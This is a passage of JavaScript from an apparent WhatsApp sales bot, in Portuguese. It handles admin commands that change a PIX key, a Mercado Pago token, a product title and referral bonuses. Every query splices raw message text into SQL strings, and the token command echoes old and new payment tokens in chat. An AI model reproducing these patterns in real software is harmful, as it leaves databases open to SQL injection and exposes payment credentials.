        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/definirchavepix===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                CHAVE_PIX_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHAVE_PIX'`).get()["VALOR"]
                CHAVE_PIX = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${CHAVE_PIX}' WHERE PARAMETRO = 'CHAVE_PIX'`).run()
                Texto = `*CHAVE PIX MANUAL ALTERADA COM SUCESSO!*

*ANTES:* ${CHAVE_PIX_Ant}

*AGORA:* ${CHAVE_PIX}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/definirinfopix===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                INFO_PIX_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'INFO_PIX'`).get()["VALOR"]
                INFO_PIX = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${INFO_PIX}' WHERE PARAMETRO = 'INFO_PIX'`).run()
                Texto = `*INFORMAÇÕES SOBRE A CHAVE PIX MANUAL ALTERADA COM SUCESSO!*

*ANTES:* ${INFO_PIX_Ant}

*AGORA:* ${INFO_PIX}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/tokenmp===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

                TokenMpDigitos = msg[1].match(/./igm)
                if (`${TokenMpDigitos[0]}${TokenMpDigitos[1]}${TokenMpDigitos[2]}${TokenMpDigitos[3]}${TokenMpDigitos[4]}${TokenMpDigitos[5]}${TokenMpDigitos[6]}${TokenMpDigitos[7]}` != "APP_USR-") {
                    Texto = `*VOCÊ ESTÁ COLOCANDO O TOKEN ERRADO!!*`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

                TOKEN_MP_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TOKEN_MP'`).get()["VALOR"]
                TOKEN_MP = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${TOKEN_MP}' WHERE PARAMETRO = 'TOKEN_MP'`).run()

                Texto = `*TOKEN MERCADO PAGO ALTERADO COM SUCESSO!*

*ANTES:* ${TOKEN_MP_Ant}

*AGORA:* ${TOKEN_MP}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/titulomp===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                TITULO_PRODUTO_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TITULO_PRODUTO'`).get()["VALOR"]
                TITULO_PRODUTO = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${TITULO_PRODUTO}' WHERE PARAMETRO = 'TITULO_PRODUTO'`).run()

                Texto = `*TITULO DO PRODUTO MERCADO PAGO ALTERADO!*

*ANTES:* ${TITULO_PRODUTO_Ant}

*AGORA:* ${TITULO_PRODUTO}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/bonusreg===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                BONUS_REGISTRO_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BONUS_REGISTRO'`).get()["VALOR"]
                BONUS_REGISTRO = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${BONUS_REGISTRO}' WHERE PARAMETRO = 'BONUS_REGISTRO'`).run()
                BONUS_REGISTRO_Ant = parseFloat(BONUS_REGISTRO_Ant).toFixed(2)
                BONUS_REGISTRO = parseFloat(BONUS_REGISTRO).toFixed(2)
                Texto = `*BÔNUS DE REGISTRO ALTERADO COM SUCESSO!*

*ANTES:* R$: ${BONUS_REGISTRO_Ant}

*AGORA:* R$: ${BONUS_REGISTRO}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/bonusindicado===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                BONUS_FOI_INDICADO_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BONUS_FOI_INDICADO'`).get()["VALOR"]
                BONUS_FOI_INDICADO = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${BONUS_FOI_INDICADO}' WHERE PARAMETRO = 'BONUS_FOI_INDICADO'`).run()
                BONUS_FOI_INDICADO_Ant = parseFloat(BONUS_FOI_INDICADO_Ant).toFixed(2)
                BONUS_FOI_INDICADO = parseFloat(BONUS_FOI_INDICADO).toFixed(2)
                Texto = `*BÔNUS AO SER INDICADO, ALTERADO COM SUCESSO!*

*ANTES:* R$: ${BONUS_FOI_INDICADO_Ant}

*AGORA:* R$: ${BONUS_FOI_INDICADO}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
